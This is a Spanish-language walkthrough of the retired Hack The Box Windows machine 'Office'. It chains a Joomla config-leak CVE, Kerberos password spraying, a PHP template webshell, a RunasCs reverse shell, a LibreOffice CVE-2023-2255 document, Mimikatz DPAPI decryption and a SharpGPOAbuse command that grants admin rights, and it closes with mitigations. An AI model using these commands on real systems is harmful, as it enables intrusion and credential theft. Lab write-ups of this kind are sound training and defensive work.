---
machine: Office
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, joomla, cve-2023-23752, kerberos, pcap, libreoffice, cve-2023-2255, dpapi, gpo]
---

# Office — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El dominio `office.htb` tiene un controlador de dominio Windows Server 2022 y un Joomla en el puerto `80`. La CVE-2023-23752 filtra la configuración de Joomla y una contraseña que pertenece a `dwolfe`. Con una lista de usuarios se hace password spray por Kerberos y se encuentra dónde se reutiliza; el usuario con acceso lee un recurso SMB con `Latest-System-Dump-8fbc124d.pcap`, que contiene un intercambio Kerberos. El hash se crackea y la contraseña abre el panel de administración de Joomla, donde una webshell en una plantilla da RCE como `web_account`. `RunasCs` lleva a `TStark`, y el sitio interno de currículums en `8083` se explota con la CVE-2023-2255 de LibreOffice para llegar a `PPotts`. Las credenciales guardadas de `HHogan` se descifran con Mimikatz y su pertenencia a GPO Managers permite abusar de una GPO y ser Administrator.

## Reconocimiento

```bash
nmap -Pn -sCV -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389 <IP>
```

- `53` DNS, `88` Kerberos, `389/636` LDAP, `445` SMB, `5985` WinRM.
- `80` y `443` publican el sitio de la empresa.
- `netexec smb <IP>` identifica `DC` con Windows Server 2022 y dominio `office.htb`.

```bash
echo "<IP> office.htb DC.office.htb" >> /etc/hosts
```

## Enumeración

El sitio usa Joomla 4. La versión es vulnerable a la CVE-2023-23752, que permite leer la configuración sin autenticación:

```bash
curl -s "http://office.htb/api/index.php/v1/config/application?public=true"
```

La respuesta incluye las credenciales de la base de datos; una de ellas funciona para `dwolfe`. Con una lista de usuarios obtenida de la web y del dominio se hace password spray:

```bash
kerbrute userenum --dc <IP> -d office.htb users.txt
netexec smb <IP> -u users.txt -p '<PASSWORD>' --continue-on-success
```

El usuario válido accede a un recurso SMB con un volcado de red:

```bash
smbclient //<IP>/<RECURSO> -U '<DOMINIO>\<USUARIO>%<PASSWORD>'
get Latest-System-Dump-8fbc124d.pcap
```

## Foothold

El PCAP contiene una autenticación Kerberos entre un cliente y el DC. En Wireshark se filtra por el puerto `88` y se extrae el `AS-REQ`/`AS-REP` con el hash. Con `hashcat` en modo `7500`, el hash se crackea y la contraseña resultante también abre el panel de administración de Joomla.

En el panel se edita una plantilla PHP y se añade una webshell. La ejecución es como `web_account` en el servidor IIS:

```text
http://office.htb/templates/<PLANTILLA>/<WEBSHELL>.php?cmd=whoami
```

## Movimiento lateral

`web_account` no tiene los permisos necesarios para el dominio. Con `RunasCs` y las credenciales de `TStark` (obtenidas del PCAP o de la enumeración) se lanza una shell en su contexto:

```powershell
RunasCs.exe TStark '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
```

`TStark` puede leer el sitio interno de currículums, que escucha en `localhost:8083` (`resume.php`). Se crea un túnel con `chisel` para acceder desde el atacante.

## Escalada de privilegios

El sitio interno procesa documentos. La versión de LibreOffice es vulnerable a la CVE-2023-2255: un documento con un frame flotante enlazado a un archivo externo carga ese contenido sin pedir permiso. Se prepara un documento malicioso y se sube como currículum; al abrirse, el enlace carga un archivo controlado y ejecuta un comando, lo que da shell como `PPotts`.

La ruta alternativa es habilitar macros bajando la seguridad del registro y enviando un documento con una macro.

`PPotts` tiene credenciales guardadas en el almacén DPAPI. Con Mimikatz se descifran y aparecen las de `HHogan`:

```powershell
mimikatz# dpapi::cred /in:C:\Users\PPotts\AppData\Local\Microsoft\Credentials\<GUID>
```

`HHogan` está en el grupo GPO Managers y tiene WinRM. Con `SharpGPOAbuse` se modifica una GPO para ejecutar un comando como Administrator en el DC, o se añade una tarea inmediata:

```powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author <DOMINIO>\Administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators HHogan /add" --GPOName "<GPO>"
```

## Evidencia

- `config/application?public=true` con credenciales.
- Password spray con un usuario válido.
- `Latest-System-Dump-8fbc124d.pcap` descargado por SMB.
- Hash Kerberos crackeado y acceso al admin de Joomla.
- Webshell en plantilla como `web_account`.
- `RunasCs` y túnel al sitio de `8083`.
- Documento con CVE-2023-2255 y shell como `PPotts`.
- Credenciales DPAPI de `HHogan` y GPO modificada.

## Lecciones aprendidas

- Una CVE de exposición de configuración puede entregar credenciales de base de datos reutilizadas.
- Un PCAP interno contiene material de autenticación crackeable.
- El panel de un CMS permite convertir permisos de escritura en RCE.
- Un sitio interno sin exponer sigue siendo atacable desde el host.
- LibreOffice carga recursos externos y puede ejecutar código sin macros.
- DPAPI y GPO Managers encadenan usuario y Administrador.

## Mitigaciones y detección

- Actualizar Joomla y restringir `/api` a redes internas.
- No reutilizar contraseñas entre base de datos, usuarios y paneles; usar cuentas de servicio.
- Cifrar y limitar los volcados de red; rotar las credenciales que aparezcan en ellos.
- Deshabilitar la edición de plantillas desde el panel y aplicar integridad en los archivos web.
- Actualizar LibreOffice y bloquear la carga de enlaces externos en documentos.
- Proteger DPAPI con credenciales fuertes y revisar quién puede administrar GPO.
- Alertar de `RunasCs`, túneles `chisel`, cambios de GPO y ejecución desde plantillas.

## Referencias

- [0xdf — Office](https://0xdf.gitlab.io/2024/06/22/htb-office.html)
- [IppSec — Office](https://www.youtube.com/watch?v=RZi77SG5KKg)
- [Hack The Box — Office](https://app.hackthebox.com/machines/office)
- [NVD — CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752)
- [NVD — CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)
